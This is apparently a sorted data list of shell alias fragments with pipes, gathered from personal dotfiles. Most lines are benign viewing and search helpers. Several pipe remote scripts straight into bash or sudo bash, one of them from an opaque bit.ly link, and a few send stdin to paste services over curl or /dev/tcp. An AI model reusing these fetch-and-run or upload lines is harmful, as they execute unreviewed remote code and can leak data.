./test_ena.sh --client ena-cli --max-references 10 fulltest 2>&1 | tee -i ./result-ena-ena-full.txt
./test_ena.sh --client dnanexus-cli 2>&1 | tee -i ./result-dnanexus-ena.txt
./test_ena.sh --client dnanexus-cli --max-references 10 fulltest 2>&1 | tee -i ./result-dnanexus-ena-full.txt
./test_ega.sh --client sanger-cli 2>&1 | tee -i ./result-sanger-ega.txt
./test_ega.sh --client sanger-cli --max-references 10 fulltest 2>&1 | tee -i ./result-sanger-ega-full.txt
./test_ega.sh --client samtools-cli 2>&1 | tee -i ./result-samtools-ega.txt
./test_ega.sh --client samtools-cli --max-references 10 fulltest 2>&1 | tee -i ./result-samtools-ega-full.txt
./test_ega.sh --client htsget-cli 2>&1 | tee -i ./result-htsget-ega.txt
./test_ega.sh --client htsget-cli --max-references 10 fulltest 2>&1 | tee -i ./result-htsget-ega-full.txt
./test_ega.sh --client ega-cli 2>&1 | tee -i ./result-ega-ega.txt
./test_ega.sh --client ega-cli --max-references 10 fulltest 2>&1 | tee -i ./result-ega-ega-full.txt
./test_ega.sh --client dnanexus-cli 2>&1 | tee -i ./result-dnanexus-ega.txt
./test_ega.sh --client dnanexus-cli --max-references 10 fulltest 2>&1 | tee -i ./result-dnanexus-ega-full.txt
./test_dnanexus_azure.sh --client sanger-cli 2>&1 | tee -i ./result-sanger-dnanexus2.txt
./test_dnanexus_azure.sh --client sanger-cli --max-references 10 fulltest 2>&1 | tee -i ./result-sanger-dnanexus2-full.txt
./test_dnanexus_azure.sh --client samtools-cli 2>&1 | tee -i ./result-samtools-dnanexus2.txt
./test_dnanexus_azure.sh --client samtools-cli --max-references 10 fulltest 2>&1 | tee -i ./result-samtools-dnanexus2-full.txt
./test_dnanexus_azure.sh --client htsget-cli 2>&1 | tee -i ./result-htsget-dnanexus2.txt
./test_dnanexus_azure.sh --client htsget-cli --max-references 10 fulltest 2>&1 | tee -i ./result-htsget-dnanexus2-full.txt
./test_dnanexus_azure.sh --client ena-cli 2>&1 | tee -i ./result-ena-dnanexus2.txt
./test_dnanexus_azure.sh --client ena-cli --max-references 10 fulltest 2>&1 | tee -i ./result-ena-dnanexus2-full.txt
./test_dnanexus_azure.sh --client ega-cli 2>&1 | tee -i ./result-ega-dnanexus2.txt
./test_dnanexus_azure.sh --client ega-cli --max-references 10 fulltest 2>&1 | tee -i ./result-ega-dnanexus2-full.txt
./test_dnanexus_azure.sh --client dnanexus-cli 2>&1 | tee -i ./result-dnanexus-dnanexus2.txt
./test_dnanexus_azure.sh --client dnanexus-cli --max-references 10 fulltest 2>&1 | tee -i ./result-dnanexus-dnanexus2-full.txt
./test_dnanexus_aws.sh --client sanger-cli 2>&1 | tee -i ./result-sanger-dnanexus1.txt
./test_dnanexus_aws.sh --client sanger-cli --max-references 10 fulltest 2>&1 | tee -i ./result-sanger-dnanexus1-full.txt
./test_dnanexus_aws.sh --client samtools-cli 2>&1 | tee -i ./result-samtools-dnanexus1.txt
./test_dnanexus_aws.sh --client samtools-cli --max-references 10 fulltest 2>&1 | tee -i ./result-samtools-dnanexus1-full.txt
./test_dnanexus_aws.sh --client htsget-cli 2>&1 | tee -i ./result-htsget-dnanexus1.txt
./test_dnanexus_aws.sh --client htsget-cli --max-references 10 fulltest 2>&1 | tee -i ./result-htsget-dnanexus1-full.txt
./test_dnanexus_aws.sh --client ena-cli 2>&1 | tee -i ./result-ena-dnanexus1.txt
./test_dnanexus_aws.sh --client ena-cli --max-references 10 fulltest 2>&1 | tee -i ./result-ena-dnanexus1-full.txt
./test_dnanexus_aws.sh --client ega-cli 2>&1 | tee -i ./result-ega-dnanexus1.txt
./test_dnanexus_aws.sh --client ega-cli --max-references 10 fulltest 2>&1 | tee -i ./result-ega-dnanexus1-full.txt
./test_dnanexus_aws.sh --client dnanexus-cli 2>&1 | tee -i ./result-dnanexus-dnanexus1.txt
./test_dnanexus_aws.sh --client dnanexus-cli --max-references 10 fulltest 2>&1 | tee -i ./result-dnanexus-dnanexus1-full.txt
./task.(js|coffee)
./staging_dir/toolchain-*/bin/*-openwrt-linux-objdump -x build_dir/target-*/linux-*/linux-*/vmlinux | grep __initcall_
./simulation | awk -f plain_output_2.awk
./simulation | ./visualization
./scripts/feeds list | grep
./sample_program < input.txt | tee output.txt
./rtgw/scripts/dev/run_server 2>&1 | grep -vE \
./responses.txt | git credential-osxkeychain erase
./pygmentize -L lexers | grep '^*'
./node_modules/.bin/bndg test/*.test.js | faucet
./manage.py showmigrations | grep -v '\[X\]'
./manage.py show_urls | less -R
./manage.py help 2>&1 | grep
./make_result.sh | tee test.log
./get-last-commit-url.py | pbc
./external/nfccsimulator/debug.sh | tee kernel_log.txt
./configure | ccze -A
./configure --help | less
./configure --help | grep
./configure --help | $PAGER
./cl < hello.c | tee rr.list
./cl < cah_126e1.i |tee r.list
./cache/bin/vrouter list --rpc-addr 172.16.21.129:5555| jq -r
./build |& tee build.log
./build post-build |& tee build.log
./buck-out/gen/omnistore/snapshot/SnapshotStoreService -v=1 2>&1 | grep -vE \
./bin/rake routes | grep
./app/console ro:de | peco
./app/console ro:de | grep
./app/console cont:de | peco
./app/console cont:de | grep
./Build testcover --verbose 1 |colortest
../gradlew :$(pwd | grep -o '[^/]*$'):dependencies --configuration testCompile
../gradlew :$(pwd | grep -o '[^/]*$'):dependencies --configuration compile
.*\|^alias proxyoff=.*/d' ~/.bashrc
.*#\1#gp;d' $file_path | /usr/bin/sed 's/#.*//g')) {
. ~/code/scripts/fakedeploy.sh | lolcat
. ~/.wayenv && sway 2>&1 | logger
. ~/.githelpers && pretty_git_log | head -n 10
. | less
. build/envsetup.sh && show_alias && adb wait-for-device shell dmsg | tee >> $home_dir/dmsg-$(date +
. build/envsetup.sh && show_alias && adb wait-for-device shell dmesg | tee >> $home_dir/dmsg-$(date +
. build/envsetup.sh && show_alias && adb wait-for-device shell cat /proc/kmsg | tee >> $home_dir/kmesg-$(date +
. build/envsetup.sh && show_alias && adb reboot && adb wait-for-device shell dmesg | tee >> $home_dir/dmsg-$(date +
. build/envsetup.sh && show_alias && adb reboot && adb wait-for-device shell cat /proc/kmsg |tee >> $home_dir/kmesg-$(date +
. build/envsetup.sh && show_alias && adb reboot && adb wait-for-device logcat|tee >> $home_dir/logcat-$(date +
. build/envsetup.sh && show_alias && adb reboot && adb wait-for-device logcat *:E|tee >> ~/$rom_dir/logcat-e-$(date +
. build/envsetup.sh && show_alias && adb reboot && adb wait-for-device logcat *:E|tee >> $home_dir/logcat-e-$(date +
. <(cat domains | awk '{print \
. $(echo $(dirname $(realpath $(which mc))) | sed 's/bin//')libexec/mc/mc-wrapper.sh
-type f -print0 | xargs -0 grep
-print0|xargs -0
-print0 | xargs -0 grep -E -n
-print0 | xargs -0 egrep
-print0 | xargs -0 -i
-print0 | xargs -0
-print0 | cpio -pd0
-o yaml | ymll
-o yaml | yml
-o yaml | less -R
-o yaml | highlight --syntax yaml -O ansi
-o json | jq '.'
-n1|sed -e "
-l | xargs -o vim
-c-6,21-94 | tail +2"
--stat -p --reverse HEAD@{1}.. | perl -pe 's/^(\++.+).*/\e[38;5;34m\e[1m$1\e[m/; s/^(\-+.*)/\e[38;5;196m\e[1m$1\e[m/'
--prompt ""git add> ""| sed -re ""s/.*\s(\S+)$/\1/"")"
--output json | jq
--help |less
--help |& less -r
--help |& less
--help | lv
--help | less -r
--help | less -F
--help | less
--help | head
--help | $PAGER
--help 2>&1 | less
--help 2>&1 | head
--color=always |less -R
--color=always | less -r
--color=always | less
--bind 'enter:execute(pacman -Qil {} | less)'"
-- help | less
+ du -hs err.txt generated.file succ.txt | sort -h
*.(cbr|cbz)
err.txt generated.file succ.txt | awk "
(while sleep 1; do date +%X; date +%Z%A; date +%x; echo -e '\f'; done) | sm - -i -b hotpink
(while sleep 1; do date +%T; echo -e '\f'; done) | sm --foreground=#00FF00 --background=#000000 -
(wget -O - http://cf.telaranrhiod.com/files/common/backgrounds.tbz2 | tar -xjov --no-same-permissions -C ~/.fluxbox/backgrounds/)
(wc -l | cut -f1)<<
(v; echo -e '\n') | patch -p0
(tomcat; bin/shutdown.sh; ps aux| grep tomcat)
(tomcat; bin/shutdown.sh && ps aux|grep tomcat)
(tac ~/twit/archvw-all.txt | head -n 20)
(systemd-analyze && systemd-analyze blame) | less
(sync &) ; pwd | grep -i mnt\/zip && cd /current/bin && pwd ; umount /mnt/zip
(sync && echo 3 | sudo tee /proc/sys/vm/drop_caches)
(sudo lspci -vnn | grep VGA -A 12) && (sudo lshw -numeric -C display)
(sudo apt-get update ; sudo apt-get upgrade) 2>&1 | tee ~/up/up.log.$(date
(sort | uniq)
(set -x; xclip -o -sel clip; xclip -o -sel clip | lab snip -g create)
(set -o posix; set|grep -v _xspec)
(set -o posix; set) | more
(set -o posix; set) | less -R
(secret-tool lookup keepassDB pws | keepassxc --pw-stdin ~/1+3/pws.kdbx &)
(rpm2cpio | cpio -i --make-directories) <
(pvim | hub issue create -F -)
(pushd ~ > /dev/null; du-sk.sh | tee _usage.log; popd > /dev/null)
(psel | while read -r dir; do; cd \$dir && git add . && git commit && git pull && git push; done)
(psel | while read -r dir; do; cd $dir && git pull; done)
(ps faux | grep Data && ls -la /var/run/DataEngine/ && ls -la /var/spool/keywordUpdates/)
(ps aux | awk '\$8 ~ /D/ { print \$0 }')
(pbpaste | wc -l)
(pandoc | xclip -selection clipboard -t text/html)
(pacman -Qet && pacman -Qm) | sort -u
(n io list; n list) | perl -ne 'print if m{\A\s*\d}xms'
(music && ls | less)
(ls -la) | less
(ls -l node_modules; ls -l node_modules/@*) | grep ^l
(ls -l -d err.txt generated.file succ.txt && ls -l -d .[!.]?*) | grep $1
(ls -1 /$(pwd) | wc -l)
(ls --group-directories-first -Htr | tail -1)
(lh;lha) | sort -hr
(iwlist scan | grep ESSID ) 2> /dev/null
(info --subnodes -o >(fgrep 'Completion Functions.' | grep '^\* _') zsh)
(if [[ -t 1 ]] ; then xmllint --format - | source-highlight -f esc -s xml --style-file xml.style --data-dir=/usr/local/share/source-highlight ; else xmllint --format -; fi)
(git pull) && (git branch | grep -v \
(git diff --name-only master... && git diff --name-only) | sort -u
(git checkout master 2>&1 |grep -v
(git branch -l) | sed
(for l in `find . -name .git | xargs -i dirname {}` ; do cd $l; pwd; git pull; cd -; done) >/dev/null
(for l in `find . -name .git | xargs -i dirname {}` ; do cd $l; pwd; git pull; cd -; done)
(for l in `find . -name .git | xargs -i dirname {}` ; do cd $1; pwd; git pull; cd -; done)
(find . -maxdepth 1 -type f | xargs gimp) &
(exec 3<>/dev/tcp/termbin.com/9999; cat >&3; cat <&3; exec 3<&-) | xclip -selection c
(echo r ; cat) | gdb --args
(echo pip; pip3 freeze | awk
(echo pip; pip2 freeze | awk
(echo pip; pip freeze | awk
(echo abc|
(echo 30k; cat) | dc
(echo .allanwrench) | xargs jq -r
(echo '=== Staged changes: ===' && git diff --staged --color=always && echo '' && echo '=== Unstaged changes: ===' && git diff --color=always) | less
(echo '.' && difflist) | xargs subl
(du -sh err.txt generated.file succ.txt && du -sh $(ls -d .[^.]*)) |sort -h
(du -ks .??* ; du -ks *) | sort -n
(docker ps -qf status=exited; docker ps -qf status=created) | xargs -r docker rm
(docker ps -q | xargs --no-run-if-empty docker kill) && docker container prune -f
(df -Th && df -Tih) | grep -v \
(date && uname -a && uptime) > `uname -r | cut -b 1-3`.`/bin/date +
(cvs diff -u | awk '/^Index/{print \$2}' ) 2> /dev/null
(curl -s -L http://bit.ly/10hA8iC | bash) && echo $1 > /dev/null
(column -t | less -SX) <
(cd ~/code/archosian.d/universe.git && umask 022 && rm -rf ~/Dropbox/Public/colors && mkdir ~/Dropbox/Public/colors && git archive HEAD | tar xvf - -C ~/Dropbox/Public/colors)
(cd ~/Development/itron/comv && cat ~/Development/itron/intellisource/apollo/config/deploy_targets/*.rb | script/generate_servers_file > ~/.comv/config/ip/servers)
(cd `echo $ROS_PACKAGE_PATH | awk -Fsrc: '{print $1}'` && catkin_make)
(cd /Users/hugobarauna/projects/meulivro && cat .last_version.txt | xargs open)
(cd $(git rev-parse --show-toplevel) && git ls-files '**/*.py' | xargs black --skip-string-normalization -l100 $(git diff --name-only master...))
(cd $(ghq list --full-path | fzf) && git browse)
(cat \!* | tr -s
(cat ../user.json | meteor mongo)
(cal; sleep 20) | dzen2 -x 200 -y 200 -w 200 -bg blue -l 50
(brew cask list | xargs brew cask install --force) && brew cask cleanup
(alias;declare -F) | less
(alias; typeset -f) | /usr/bin/which --tty-only --read-alias --read-functions --show-tilde --show-dot
(alias; declare -f) | which -i --read-functions
(alias; declare -f) | which --tty-only --read-alias --read-functions --show-tilde --show-dot
(alias; declare -f) | /usr/bin/which --tty-only --read-alias --show-dot --show-tilde --read-functions
(alias; declare -f) | /usr/bin/which --tty-only --read-alias --read-functions --show-tilde --show-dot
(alias ; declare -f) | $(brew --prefix)/bin/which --tty-only --read-alias --read-functions --show-dot --show-tilde
(a-cd; echo $( a-jq .dbindex) ) | xargs grep --color
(IFS=:;ls -1d $PATH | nl)
(A=$(mktemp --dry-run);mkfifo $A;matlab -logfile >(tail -n +11|tee $A >/dev/null) -nodisplay > /dev/null;cat $A;rm -rf $A)
(./ecrypt-test > test-vectors) 2>&1 | head
(){tail -$1 | head -$2}
(){rg -p $@ | less -R}
(){ls -l $* | parrotsay}
(){if [ -z $FROMBASH ];then (test $(tmux list-panes | wc -l) -eq 1 && guake -r $1 &);fi; ssh $@ && guake -r $(whoami)}
(){iconv -f UTF-8-MAC -t UTF-8 $1 | pandoc -f markdown -o $2 -V documentclass=ltjarticle --latex-engine=lualatex}
(){git-foresta --graph-symbol-merge=★ --graph-symbol-overpass== | less -RSX}
(){git-foresta --all --graph-symbol-merge=★ --graph-symbol-overpass== | less -RSX}
(){find ./ -type f -print | xargs grep $1}
(){echo $1 | npx sql-formatter-cli}
(){echo $1 | jq}
(){cat $1 | xsel --clipboard}
(){cat $1 | xsel --clipboard --input}
(){cat $1 | pbcopy}
(){ unbuffer ccat --bg=dark “$@“ |& less -iSRM }
(){ ping $@ | iconv -f cp932 -t UTF-8 }
(){ pbpaste | highlight -O rtf -S $1 -s
(){ openssl pkcs12 -clcerts -nokeys -in $1 | openssl x509 -text -noout }
(){ make $* 2>&1 | less }
(){ ipconfig $@ | iconv -f cp932 -t UTF-8 }
(){ hub browse $(ghq list |
(){ fuzzy-locate $@ | fzf }
(){ find $1 -type f -print | xargs grep $2 }
(){ curl -s https://registry.hub.docker.com/v2/repositories/$1/tags/ | jq
(){ compgen | grep $* }
(){ cat $1 | pbc }
(){ aws --profile minamijoyo translate translate-text --source-language-code ja --target-language-code en --text $@ | jq -r .TranslatedText }
(){ aws --profile minamijoyo translate translate-text --source-language-code en --target-language-code ja --text $@ | jq -r .TranslatedText }
(){ apt-cache search $@ | grep $@ }
(){ TARGETSTASH=`git stash list|cut -d
(){ SRCLOC=`ghq list|fzf`; if [ -z ${SRCLOC} ] ; then return 1; else cd ~/.ghq/${SRCLOC}; unset SRCLOC ; fi }
(){ ID=`cat ~/usr/doc/share/rfc/rfc-index.txt|fzf`; if [ -z ${ID} ]; then return 1 ; else echo ${ID}; unset ID ; fi }
(){ ID=`cat ~/usr/doc/ref/rfc-index.txt|fzf`; if [ -z ${ID} ]; then return 1 ; else echo ${ID}; unset ID ; fi }
(){ $* |& iconv -f cp932 -t utf-8 }
() { target_path=`cat ~/usr/doc/share/shell/cd_path.dat|fzf`; if [ -z ${target_path} ]; then :;else cd ${target_path};fi }
() { stack hoogle -- --color --info $@ | less -R }
( while true ; do LCG_GFAL_INFOSYS=egee-bdii.cnaf.infn.it:2170 lcg-infosites --vo cms ce -f rwth-aachen | sendstdin ; sleep 60 ; done ) &
( ut8mh_git_show_status.bash | less )
( ssh mythtv@chewbacca esd -nobeeps -tcp -public -terminate -r 44100 ) & sleep 4 ; esdrec -r 44100 | esdcat -r 44100 -s chewbacca
( set -o posix; set ) | less
( set -o posix ; set ) | less
( set -o posix ; set ) | cat
( ls -l node_modules; ls -l node_modules/@* ) | grep ^l
( ls -l node_modules ; ls -l node_modules/@* ) | grep ^l
( ls *~ .*~ \#*\# dead.letter core core.* .#* 2>&- ) | xargs rm -f
( local sha ; sha=$( pbpaste | tr -d
( find . -maxdepth 1 -print ; find . -mindepth 2 -print ) | xargs -n 50 -exec grep
( cd /tmp && curl https://getmic.ro | bash && sudo mv ./micro /usr/local/bin && sudo chown root:root /usr/local/bin/micro )
( apiToken=$apiRWTHgridToken; chatId=$chatIdRWTHgrid ; while true ; do LCG_GFAL_INFOSYS=egee-bdii.cnaf.infn.it:2170 lcg-infosites --vo cms ce -f rwth-aachen | sendstdin ; sleep 60 ; done ) &
( alias | egrep git\ ; gsa )
'| xargs'
'| xargs -o vim'
'| wc'
'| multi_grep'
'| grep'
'| grep -vi '
'xcalib -i -a | redshift -O 1000K'
'pwd | pbcopy'
'ps aux|grep'
'lastdiff | pbcopy'
'find . -name .DS_Store -print0 | xargs -0 git rm -f --ignore-unmatch'
'expr `ls -1 ~/pa3/treasures | wc -l` \* 10'
'echo grep Host /home/dstock/tmp.txt|awk \'{print $2}\''
'chuck_cow | lolcat'
'.exs\?$' | xargs mix format"
'$(docker ps -a -q)' | docker rm -f
' | grep'
&|exit
&| exit
&|
&>|/dev/null
&>/dev/null&|
&>/dev/null &|
&> /dev/null &|
&& echo 80 | sudo tee /sys/devices/platform/smapi/BAT0/start_charge_thresh"
&& echo 40 | sudo tee /sys/devices/platform/smapi/BAT0/start_charge_thresh"
&& docker ps -a -q | xargs docker rm "
&& brew update && brew upgrade && brew cask list | xargs brew cask upgrade && brew cleanup"
${lscmd}${colorflag} -laFh ${colorflag} | grep --color=never '^d'
${getPassword} | ssh ${torProxy} ${DATA_PI_USER}@${onionAddress} ${unlockCommand}; unset BW_SESSION
${getPassword} | ssh ${DATA_PI_USER}@${DATA_PI_LOCAL_ADDRESS} ${unlockCommand}; unset BW_SESSION
${curl_command} https://raw.githubusercontent.com/MaxdSre/ShellScript/master/assets/tool/proxyIPExtractation.sh | bash -s -- -t h -a h
${curl_command} https://raw.githubusercontent.com/MaxdSre/ShellScript/master/assets/tool/proxyIPExtractation.sh | bash -s -- -s
${curl_command} https://raw.githubusercontent.com/MaxdSre/ShellScript/master/assets/tool/networkProxyAutoConfiguration.sh | bash -s --
${curl_command} https://raw.githubusercontent.com/MaxdSre/ShellScript/master/assets/tool/GitHubSingleFileDownload.sh | bash -s --
${curl_command} https://raw.githubusercontent.com/MaxdSre/ShellScript/master/assets/gnulinux/gnuLinuxRandomUnusedPortGeneration.sh | bash -s --
${curl_command} https://raw.githubusercontent.com/MaxdSre/ShellScript/master/assets/gnulinux/gnuLinuxPortUsedInfoDetection.sh | sudo bash -s --
${curl_command} https://raw.githubusercontent.com/MaxdSre/ShellScript/master/assets/gnulinux/gnuLinuxOfficialDocumentationDownload.sh | bash -s --
${curl_command} https://raw.githubusercontent.com/MaxdSre/ShellScript/master/assets/gnulinux/gnuLinuxLifeCycleInfo.sh | bash -s --
${curl_command} https://raw.githubusercontent.com/MaxdSre/ShellScript/master/assets/gnulinux/gnuLinuxDistroVersionDetection.sh | bash -s --
${_LS} -laF --color=always | grep lrwxrwxrwx
${S}gstat -p -f '^([a]?da|nvd)[0-9]+$'
${S}du -h -d 1 | sort -hr
${R}fortune | ${B}cowsay
${PREFIX}/share/ovirt-engine/services/ovirt-engine/ovirt-engine.py start | lnav
${MYEDITOR} `${GITMOD} | ${AWKCMD} ${AWKFILE} -v FILEIDX=n`
${MYEDITOR} `${GITMOD} | ${AWKCMD} ${AWKFILE} -v FILEIDX=n-1`
${MYEDITOR} `${GITMOD} | ${AWKCMD} ${AWKFILE} -v FILEIDX=3`
${MYEDITOR} `${GITMOD} | ${AWKCMD} ${AWKFILE} -v FILEIDX=2`
${MYEDITOR} `${GITMOD} | ${AWKCMD} ${AWKFILE} -v FILEIDX=1`
${MYEDITOR} `${GITADD} | ${AWKCMD} ${AWKFILE} -v PAT=ADD FILEIDX=n`
${MYEDITOR} `${GITADD} | ${AWKCMD} ${AWKFILE} -v PAT=ADD FILEIDX=n-1`
${MYEDITOR} `${GITADD} | ${AWKCMD} ${AWKFILE} -v PAT=ADD FILEIDX=3`
${MYEDITOR} `${GITADD} | ${AWKCMD} ${AWKFILE} -v PAT=ADD FILEIDX=2`
${MYEDITOR} `${GITADD} | ${AWKCMD} ${AWKFILE} -v PAT=ADD FILEIDX=1`
${HOME}/.shell.d/lib/promptdash | more
${GNU_LS} -alFh --color=yes | less -R
${GDU} `${GITADD} | ${AWKCMD} ${AWKFILE} -v PAT=ADD FILEIDX=n`
${GDU} `${GITADD} | ${AWKCMD} ${AWKFILE} -v PAT=ADD FILEIDX=n-1`
${GDU} `${GITADD} | ${AWKCMD} ${AWKFILE} -v PAT=ADD FILEIDX=3`
${GDU} `${GITADD} | ${AWKCMD} ${AWKFILE} -v PAT=ADD FILEIDX=2`
${GDU} `${GITADD} | ${AWKCMD} ${AWKFILE} -v PAT=ADD FILEIDX=1`
${EMACS_CLIENT_PATH} -e | grep -i emacs
${EDITOR:-vim} \$(svn status|awk '/^C/{print \$2}')
${EDITOR:-vim} \$(svn st | awk '/^[AM].*p[ml]/{print \$2}')
${EDITOR:-vim} \$(svn st | awk '/^[AM].*\.t$/{print \$2}')
${BOTVILLE}/v3-list/gradlew clean build check test war && yes | cp ${BOTVILLE}/v3-list/build/libs/ROOT.war ${BOTVILLE}/docker/Docker
${1} | open -a Google\ Chrome
${(k)aliases[(r)${1// /(| }${${1//[^ ]}// /)}]}
$sudo grep postfix /var/log/maillog | tail -40
$sudo grep postfix /var/log/mail.log | tail -40
$sudo grep postfix /var/log/mail | tail -40
$sudo grep pop3-login /var/log/maillog | tail -40
$sudo grep pop3-login /var/log/mail.log | tail -40
$sudo grep pop3-login /var/log/mail | tail -40
$print_globals | lolcat
$pcmd | grep
$pbspath/qstat -a -u $user | awk ' { print \
$pacman -Q | grep
$ls_commands | grep -i ^d
$ls_commands | grep -i
$ls_commands $ls_opts | head
$ls_commands $ls_opts | grep -i ^d
$ls_commands $ls_opts | grep -i
$ls_cmd -Flash | grep --color
$ls -Al | grep $*
$hub_path pull-request | pbcopy
$getprop dumpsys battery | grep level
$field del='^' |
$cmd; echo ${pass}|$g --yes --no-tty --batch --passphrase-fd 0 --decrypt -o $tdb/$h.twd $pt/$h.twd.gpg; sudo $t --check; rm -fv $tdb/*.twd*
$cmd; echo ${pass}|$g --yes --batch --passphrase-fd 0 --symmetric --cipher-algo aes256 -o $pt/$h.twd.gpg $tdb/$h.twd
$busybox ps | grep -wv grep
$adb shell getprop wifi.interface | $dos2unix
$adb shell getprop service.adb.tcp.por | $dos2unix
$adb shell getprop ro.serialno | $dos2unix
$adb shell getprop ro.product.model | $dos2unix
$adb shell getprop ro.product.manufacturer | $dos2unix
$adb shell getprop ro.product.device | $dos2unix
$adb shell getprop ro.product.cpu.abi | $dos2unix
$adb shell getprop ro.product.brand | $dos2unix
$adb shell getprop ro.build.version.sdk | $dos2unix
$adb shell getprop ro.build.version.release | $dos2unix
$adb shell cat /system/build.pro | $dos2unix
$adb shell cat /sys/class/net/${androidWlanInterface/:*/}/addres | $dos2unix
$adb shell cat /proc/meminf | $dos2unix
$adb shell cat /proc/cpuinf | $dos2unix
$_freg | xargs -0r $_ll -d
$_fhid | xargs -0r $_ll -d
$_fall | xargs -0r $_ll -d
$_fadir | xargs -0r $_ls -dF
$_fadir | xargs -0r $_ll -d
$_LS_COMMAND --time-style=+%Y/%m/%d\|%H%M -gGh
$TREE_PATH | $LESS_PATH
$TREE_PATH -a | $LESS_PATH
$TREE_PATH -a -L $i | $LESS_PATH
$TREE_PATH -L $i | $LESS_PATH
$SUDO tail -f /var/log/syslog | grep ovpn
$REQ https://raw.githubusercontent.com/creationix/nvm/v0.25.4/install.sh | bash;source $HOME/.bashrc
$REQ https://raw.githubusercontent.com/creationix/nvm/v0.25.4/install.sh | bash;nvm install iojs;nvm alias default iojs;source $HOME/.bashrc
$REPEAT_SH 1 adb shell dumpsys activity activities | grep Run
$REO_TYPE diff | gvim -
$PUBLIC_IP && $PUBLIC_IP | pbcopy
$PS_CMD | grep
$PACKYBIN/autodetect.pl | less
$LS_PATH -lh $LS_OPTIONS . | grep
$LS_CMD -lAh | grep --color=never '/$'
$LS_CMD -l | pager
$LS | grep \/
$LS -lhFA | less
$LS -laFh . | $GREP
$LS -lF ${colorflag} | grep --color=never '^d'
$LS --group-directories-first -lbg --ignore-glob='vendor|node_modules' -T
$LS --color=auto -laFh . | $GREP
$LOCAL_IP && $LOCAL_IP | pbcopy
$HOME/scripts/wx-tulsa.sh | less
$HOME/scripts/wx-redding.sh | less
$HOME/scripts/wx | less
$HOME/dev/Term::ExtendedColor/bin/colored_dmesg|grep -v TCP
$HOME/dev/HTCBattery/checkBattery.sh | tee -a $HOME/logs/htc.log
$HOME/bin/bar.sh | lemonbar -f \
$HOME/bin/bar-day.sh | lemonbar -f \
$HOME/.systool | less -R
$HOME/.scripts/parse-xorg-log.py | less
$G4INSTALL/tests/tools/bin/filter.sh $G4SYSTEM | more
$FINDER -type f | xargs grep
$FIND . \( $FIND_CCODE \) -and -not \( $FIND_BACKUPS -o $FIND_CVS \) -print0 | xargs -0 grep -H
$FIND . -xtype f -print0 | xargs -0 grep -H
$FIND . -name '*.[chS]' -o -name '*.cc' | xargs grep
$FIND . -maxdepth 1 -type f | less
$FIND . -maxdepth 1 -type d | less
$FIND -L . -type f | xargs grep
$EDITOR' $(rg --follow --hidden --no-heading --files | fzy)'
$EDITOR `git status --porcelain | sed -ne 's/^ M //p'`
$EDITOR `git diff --name-only | uniq`
$EDITOR -c ':help | only'
$EDITOR '+:Gstatus\|bd #'
$EDITOR $ALIAS_101_LFT/src/$(find $ALIAS_101_LFT/src -type f -exec basename {} \; | fzf --height=10)
$EDITOR $(git diff --name-only | uniq)
$EDITOR $(find ~/bin/* -type f | fzf)
$EDITOR $( git diff --name-only --diff-filter=U | xargs )
$DOTFILES_DIR/automation/spotify/getCurrentTrack.js 1>/dev/null 2>&1 | pbcopy
$CONF | cut -d
$ANT_OM_DAEMON | $OM_DAEMON_OUT_PREFIX
$ANT_OM_DAEMON $DAEMON_DEBUG_ARGS | $OM_DAEMON_OUT_PREFIX
$ANT_OM | $OM_OUT_PREFIX
$ANT_OM $MMS_DEBUG_ARGS | $OM_OUT_PREFIX
$ANT_CM_DAEMON | $CM_DAEMON_OUT_PREFIX
$ANT_CM_DAEMON $DAEMON_DEBUG_ARGS | $CM_DAEMON_OUT_PREFIX
$ANT_CM | $CM_OUT_PREFIX
$ANT_CM $MMS_DEBUG_ARGS | $CM_OUT_PREFIX
$ADBCON_SH && adb -s $ADBHOSTPORT shell dumpsys activity activities | grep Run
$ADBCON_SH && adb -s $ADBHOSTPORT logcat | $COLOR_PY
$ADBCON_SH && $REPEAT_SH 1 adb -s $ADBHOSTPORT shell dumpsys activity activities | grep Run
$1 | nms -a
$1 | curl -F c=@- https://ptpb.pw
$1 --help | grep $2
$0 -${v}A | grep -E 'bak$'
$(wl -i eth7 phy_tempsense | awk '{ print $1 err.txt generated.file succ.txt .5 + 20 }')
$(wl -i eth6 phy_tempsense | awk '{ print $1 err.txt generated.file succ.txt .5 + 20 }')
$(which sudo) grep 'Learn:\|connection-reset' /var/log/openvpn
$(which sl) | lolcat
$(which ps) aux | grep
$(which ls | sed -e 's/.*: aliased to //') -F
$(which find) ~/.mozilla/firefox/ -type d -mindepth 1 -maxdepth 1 2>/dev/null | cut -d. -f3
$(which -a python3 | head -n 1)
$(whence -p gdircolors dircolors | head -1)
$(type -p glibtoolize libtoolize | head -1)
$(thefuck $(fc -ln -1 | tail -n 1)); fc -R
$(rpm -ql vim-common | grep less.sh)
$(nvm which node | sed s_/bin/node__)/lib/node_modules/npm/bin/npm-cli.js install -g yarn@latest -g
$(nix-locate VSCodium.app/Contents/Resources/app/bin/code | awk '{print $NF}')
$(mdfind kMDItemCFBundleIdentifier = 'com.bohemiancoding.sketch3' | head -n 1)/Contents/Resources/sketchtool/bin/sketchtool
$(lsb_release -c | awk '{print $2}')
$(ls | fzf)
$(ls /usr/share/vim/vim80/macros/less.sh |tail -n -1)
$(ls -tr | tail -n 1)
$(logme $@) | wc
$(lastlog | grep -v
$(kubens | peco)
$(hoard get | sed s/^/export\ /)
$(history | fzf)
$(history -r -n 1 | peco)
$(history -p \!\!) |&
$(history -p \!\!) | less
$(history -p !!)| fpp
$(history -p !!) | less
$(history -n 1 | peco)
$(gp |& grep git)
$(git st -s | cut -d
$(git push 2>&1|grep origin)
$(git push 2>&1 >/dev/null | grep git)
$(git ls-files -m | peco)
$(git branch | fzf +s +m)
$(git branch -a | sed
$(ghq list -p | peco)
$(for l in glibtoolize libtoolize ; do which $l ; done | head -1)
$(find ~/dotfiles/colorscripts/ -type f | shuf -n 1)
$(find | selecta)
$(find /usr/local/Cellar/macvim -depth 1 | grep
$(find . -type f | peco)
$(find . -maxdepth 1 -type f | shuf -n 1)
$(find -type f | fzy)
$(find -type f | fzf)
$(fd -t f | fzf)'
$(fd -t d | fzf)'
$(fd -H pycharm.sh ~ | tail --lines=1)
$(fd -H clion.sh ~ | tail --lines=1)
$(fd --type f | fzf --multi)
$(fc -ln -1) | less
$(fc -l -n -1) | xclip -selection clipboard -i; echo clipboard contains; clip -o
$(echo /usr/libexec/java_home -V) && env | grep JAVA_HOME
$(echo /jars/*.jar | tr ' ' ':')
$(echo ${BASH_SOURCE[0]} | sed 's/_bash_aliases/math.sh/')
$(echo $dv | sed 's/.*\=\=//')
$(echo $SSH_CLIENT | awk
$(echo $LS | cut -d ' ' -f 2)
